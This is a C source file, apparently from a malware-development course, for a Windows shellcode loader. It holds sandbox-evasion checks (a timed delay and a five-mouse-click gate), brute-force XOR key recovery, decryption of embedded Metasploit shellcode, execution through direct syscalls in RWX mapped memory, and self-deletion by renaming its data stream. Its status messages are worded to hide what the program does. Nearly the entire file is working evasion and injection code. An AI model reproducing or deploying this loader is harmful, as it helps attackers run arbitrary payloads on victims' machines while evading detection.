// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

#include "SysWhispers.h"
#ifndef NEW_STREAM
#define NEW_STREAM L":MangledStream"
#endif


// Global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;



// The callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
		printf("[+] Mouse Click Recorded \n");
		g_dwMouseClicks++;
	}

	return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}



BOOL MouseClicksLogger() {

	MSG 	Msg = { 0 };

	// Installing hook 
	g_hMouseHook = SetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)HookEvent,
		NULL,
		NULL
	);
	if (!g_hMouseHook) {
		printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
	}

	// Process unhandled events
	while (GetMessageW(&Msg, NULL, NULL, NULL)) {
		DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}


BOOL DeleteSelf() {


	WCHAR				    szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE				    hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//--------------------------------------------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	//--------------------------------------------------------------------------------------------------------------------------

	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//--------------------------------------------------------------------------------------------------------------------------
	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------
	// DELEING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...");

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}



typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
	);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// Converting minutes to milliseconds
	DWORD                   dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval = { 0 };
	LONGLONG                Delay = NULL;
	NTSTATUS                STATUS = NULL;
	fnNtDelayExecution      pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtDelayExecution");
	DWORD                   _T0 = NULL,
		_T1 = NULL;

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	return TRUE;
}



#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)
#define HINT_BYTE 0x3A

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {

	for (SIZE_T i = 0x00, j = 0x00; i < sShellcodeSize; i++, j++) {

		if (j == sKeySize)
			j = 0x00;

		if (i % 2 == 0)
			pShellcode[i] = pShellcode[i] ^ pbKey[j];
		else
			pShellcode[i] = pShellcode[i] ^ pbKey[j] ^ j;
	}
}

unsigned char ProtectedKey[] = {
		0xF4, 0xCA, 0xB5, 0x84, 0x72, 0x47, 0x73, 0x59, 0xE8, 0x2C, 0xBF, 0x78, 0x5E, 0x00, 0x60, 0xB5 };

BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

	BYTE            b = 0;
	INT             i = 0;
	PBYTE           pRealKey = (PBYTE)malloc(sKey);

	if (!pRealKey)                                                                                           return NULL;

	while (1) {

		if (((pProtectedKey[0] ^ b)) == HintByte)
			break;
		else
			b++;

	}

	for (int i = 0; i < sKey; i++) {
		pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
	}

	*ppRealKey = pRealKey;
	return b;
}


// x64 calc metasploit shellcode 
unsigned char Payload[] = {
		0xC6, 0x4A, 0xFA, 0xA0, 0x48, 0x69, 0x77, 0x97, 0x1E, 0xD0, 0x26, 0xF1, 0xC5, 0x9C, 0xF2, 0x32,
		0x6C, 0x4A, 0x48, 0x96, 0xDD, 0xC9, 0x3C, 0xC5, 0x7E, 0x98, 0xEC, 0xF2, 0x9C, 0x84, 0x2B, 0x31,
		0x1A, 0x4A, 0xF2, 0x36, 0xE8, 0xC9, 0xB8, 0x20, 0x54, 0x9A, 0x2A, 0x91, 0x4D, 0x84, 0x91, 0xA3,
		0x96, 0x3E, 0x18, 0x38, 0xBA, 0xAD, 0x97, 0xD6, 0xDF, 0x19, 0x6A, 0xE1, 0x85, 0x0D, 0x42, 0x8E,
		0x68, 0x43, 0x28, 0x0C, 0x33, 0xD3, 0x97, 0x1C, 0x5C, 0xEC, 0x2F, 0xA1, 0x54, 0x47, 0x20, 0xEB,
		0x3A, 0x02, 0x79, 0x0C, 0x3D, 0x41, 0xC3, 0xF0, 0x56, 0xD1, 0xB7, 0xF0, 0x0F, 0x84, 0xB8, 0x27,
		0xB1, 0x42, 0x59, 0x0D, 0xB9, 0x51, 0x54, 0xC1, 0x56, 0x2F, 0xAE, 0xE1, 0x0F, 0xF8, 0x28, 0x2B,
		0x3B, 0xD4, 0x34, 0x75, 0x71, 0xC9, 0x86, 0x57, 0xB2, 0x91, 0xA6, 0x69, 0x89, 0x8D, 0xA1, 0xA2,
		0x02, 0xE2, 0x0C, 0xB5, 0xF4, 0x82, 0xFB, 0xB3, 0x16, 0x95, 0x5E, 0x71, 0xF1, 0x14, 0xF8, 0x27,
		0xB1, 0x42, 0x5D, 0x0D, 0xB9, 0x51, 0xD1, 0xD6, 0x95, 0xDC, 0x2F, 0xE4, 0x0F, 0x8C, 0xBC, 0x2A,
		0x3B, 0xD2, 0x38, 0xCF, 0xBC, 0x09, 0xFF, 0x96, 0xCE, 0x91, 0x3F, 0xE1, 0xDC, 0x92, 0xF9, 0x39,
		0x7B, 0x5A, 0x38, 0x1D, 0xF9, 0xDB, 0xFF, 0x14, 0xF2, 0xF0, 0x26, 0xF2, 0x7B, 0x2C, 0xF8, 0x22,
		0x63, 0x58, 0x31, 0xCF, 0xAA, 0x68, 0xE0, 0x68, 0xE1, 0x2F, 0x3A, 0xE9, 0x3A, 0xBB, 0xD3, 0x51,
		0x65, 0x31, 0x4B, 0x44, 0xB8, 0xC0, 0xE1, 0xDE, 0x97, 0x36, 0x2F, 0x21, 0x68, 0x6C, 0xA1, 0x63,
		0x3A, 0x4B, 0xF0, 0xA1, 0xF1, 0x3D, 0xB5, 0x97, 0x0F, 0x8C, 0xA7, 0x08, 0x85, 0xD1, 0xE1, 0x37,
		0x73, 0x8B, 0x9D, 0x08, 0x31, 0x70, 0xF6, 0x2D, 0x52, 0xA7, 0x41, 0xA7, 0x7B, 0x19, 0xEC, 0xEA,
		0xD0, 0x6A, 0x78, 0x45, 0xB8, 0x81, 0xEE, 0xD6, 0xA4, 0xF9, 0xE7, 0xCB, 0x84, 0x33, 0x75, 0x33,
		0x6A, 0x4F, 0x48, 0x8D, 0xF5, 0xB0, 0x77, 0xDF, 0xE1, 0x10, 0x2F, 0x29, 0x46, 0x84, 0x5F, 0xA3,
		0x72, 0x8B, 0xB8, 0x05, 0x02, 0x6B, 0xB8, 0x48, 0xFE, 0x2F, 0xB2, 0xE8, 0x0D, 0x0B, 0xCA, 0x73,
		0x7B, 0x5A, 0x35, 0xCD, 0x5A, 0xC9, 0x3E, 0x6E, 0x5F, 0x6A, 0xFE, 0x05, 0xF0, 0xAD, 0x5F, 0xB6,
		0x72, 0x83, 0xBD, 0x04, 0xBA, 0x81, 0xB7, 0xDE, 0xA6, 0xB3, 0x0A, 0xC4, 0x84, 0xCC, 0xA0, 0x63,
		0x3A, 0x43, 0x29, 0x05, 0xE8, 0xC9, 0x3E, 0x75, 0x49, 0x87, 0x30, 0xED, 0xB5, 0x0C, 0xCA, 0x6E,
		0x63, 0x43, 0x29, 0xA6, 0x44, 0xE7, 0x70, 0xD3, 0x3A, 0x84, 0x66, 0xA1, 0xCC, 0x41, 0xE4, 0x47,
		0x22, 0xC4, 0x79, 0x2C, 0xF0, 0x08, 0x51, 0xC1, 0x4E, 0x91, 0x37, 0xE1, 0xD4, 0x8D, 0xF0, 0x2A,
		0xC5, 0xC2, 0x38, 0x14, 0xF1, 0x7E, 0x7F, 0xDA, 0x97, 0x11, 0x2B, 0x29, 0x45, 0x8D, 0x1A, 0x1A,
		0xF6, 0x3D, 0xFF, 0xBB, 0x6D, 0xC9, 0x86, 0x45, 0x56, 0x2F, 0xAD, 0x2B, 0x8A, 0x8D, 0x1A, 0x6B,
		0xBD, 0x1F, 0x19, 0xBB, 0x6D, 0x3A, 0x7A, 0xF3, 0x81, 0xB8, 0x26, 0x1A, 0x22, 0x59, 0x1D, 0xFE,
		0xC5, 0xD7, 0x31, 0xC7, 0x7C, 0xA9, 0x8B, 0x91, 0x62, 0xDA, 0xE7, 0x5B, 0x64, 0xB9, 0xA5, 0xD8,
		0x7D, 0x11, 0x0B, 0x2B, 0xD2, 0x81, 0xEE, 0xD6, 0x97, 0x0A, 0x98, 0x75, 0x84 };



BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pAddress = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------	
	// allocating local map view 
	
	if ((STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	
	// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);

//--------------------------------------------------------------------------

	// executing the payload via thread creation

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// unmpaing the local view
	/*
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	*/

	// closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

DWORD WINAPI MonitorClicksThread(LPVOID lpParam) {
	printf("[i] Monitoring for Clicks...\n");
	MouseClicksLogger();
	return 0;
}



int main() {
	PBYTE pRealKey = NULL;
	BYTE bBruteForceByte = 0;
	HANDLE hClickThread = NULL;

	printf("[*] Initialize Core Execution Module\n");

	if (!DelayExecutionVia_NtDE(0.5f)) {
		printf("[!] Environment validation failed. Aborting.\n");
		return -1;
	}

	hClickThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorClicksThread, NULL, 0, NULL);
	if (!hClickThread) {
		printf("[!] Internal thread allocation error.\n");
		return -1;
	}

	printf("[i] Awaiting user interaction constraints...\n");
	while (g_dwMouseClicks < 5) {
		Sleep(500);
	}

	if (g_hMouseHook) {
		UnhookWindowsHookEx(g_hMouseHook);
	}
	TerminateThread(hClickThread, 0);
	CloseHandle(hClickThread);
	printf("[+] Integrity check passed. Proceeding with decryption.\n");

	bBruteForceByte = BruteForceDecryption(HINT_BYTE, ProtectedKey, sizeof(ProtectedKey), &pRealKey);
	if (pRealKey == NULL) {
		printf("[!] Failed to recover routine cryptographic token.\n");
		return -1;
	}

	XorByInputKey(Payload, sizeof(Payload), pRealKey, sizeof(ProtectedKey));
	free(pRealKey);
	printf("[+] Payload array decrypted successfully.\n");

	if (!LocalMappingInjectionViaSyscalls(Payload, sizeof(Payload))) {
		printf("[!] Critical error during dynamic system call translation.\n");
		return -1;
	}
	printf("[+] Routine executed successfully within secure boundary.\n");
	printf("[i] Synchronizing remote network interface packets...\n");
	Sleep(50000);

	printf("[i] Deploying self-disposition wipe routing...\n");
	if (DeleteSelf()) {
		printf("[+] Resource cleanup finalized successfully.\n");
	}
	else {
		printf("[!] Disposition routing returned an unhandled error.\n");
	}

	printf("[*] Core Execution Module Finalized\n");
	return 0;
}


